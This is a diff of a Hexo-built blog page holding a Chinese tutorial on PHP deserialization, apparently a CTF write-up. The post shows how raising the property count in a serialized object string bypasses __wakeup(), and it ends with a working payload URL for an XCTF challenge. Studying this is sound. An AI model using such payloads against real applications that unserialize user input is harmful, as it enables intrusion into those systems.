@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      876 字
+      877 字
     </span>
   
 
@@ -249,13 +249,13 @@
               <p>反序列化</p>
 <span id="more"></span>
 <p>PHP魔术方法_ wakeup()是在反序列化操作中起作用的魔法函数， 当unserialize的时候， 会检查时候存在 __ wakeup()函数, 如果存在的话，会优先调用__wakeup()函数。 </p>
-<p>而<strong>wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用</strong>wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。</p>
+<p>而__wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用__wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。</p>
 <p>serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后， 可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
 <p>unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p>
 <p>举例说明</p>
 <div class="hljs"><pre><code>&lt;?php
 class Student&#123;
-public $full_name = &apos;zhangsan&apos;;
+public $full_name = &#39;zhangsan&#39;;
 public $score = 150;
 public $grades = array();
 
@@ -266,8 +266,12 @@ echo &quot;__wakeup is invoked&quot;;
 
 $s = new Student();
 var_dump(serialize($s));
-?&gt;</code></pre></div><hr>
-<div class="hljs"><pre><code>O:7:&quot;Student&quot;:3:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;</code></pre></div><p>各个符号的含义<br><strong>变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容}</strong></p>
+?&gt;
+</code></pre></div>
+<hr>
+<div class="hljs"><pre><code>O:7:&quot;Student&quot;:3:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;
+</code></pre></div>
+<p>各个符号的含义<br><strong>变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容}</strong></p>
 <p>其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。<br>wakeup()漏洞就是与整个属性个数值有关。<strong>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。</strong></p>
 <p>当我们将上述的序列化的字符串中的对象属性个数修改为5，变为<br>O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}</p>
 <p>最后执行运行的代码如下:</p>
@@ -281,12 +285,12 @@ var_dump(serialize($s));
 <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup is invoked&quot;</span>;
 &#125;
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
-var_dump(<span class="hljs-keyword">$this</span>);
+<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$this</span>);
 &#125;
 &#125;
 
-<span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> Student();
-<span class="hljs-variable">$stu</span> = unserialize(<span class="hljs-string">&#x27;O:7:&quot;Student&quot;:5:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;&#x27;</span>);
+<span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();
+<span class="hljs-variable">$stu</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:7:&quot;Student&quot;:5:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;&#x27;</span>);
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
 
@@ -306,12 +310,16 @@ var_dump(<span class="hljs-keyword">$this</span>);
 <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);
 &#125;
 &#125;
-<span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> xctf();   <span class="hljs-comment">//使用new运算符来实例化该类（xctf）的对象为test</span>
-<span class="hljs-keyword">echo</span>(serialize(<span class="hljs-variable">$test</span>));   <span class="hljs-comment">//输出被序列化的对象（test）</span>
+<span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">xctf</span>();   <span class="hljs-comment">//使用new运算符来实例化该类（xctf）的对象为test</span>
+<span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>));   <span class="hljs-comment">//输出被序列化的对象（test）</span>
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 <p>输出结果</p>
-<div class="hljs"><pre><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></pre></div><p>我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：<br>当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示：</p>
-<div class="hljs"><pre><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></pre></div><p>访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
+<div class="hljs"><pre><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;
+</code></pre></div>
+<p>我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：<br>当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示：</p>
+<div class="hljs"><pre><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;
+</code></pre></div>
+<p>访问url?code&#x3D;O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
 
             </div>
             <hr>
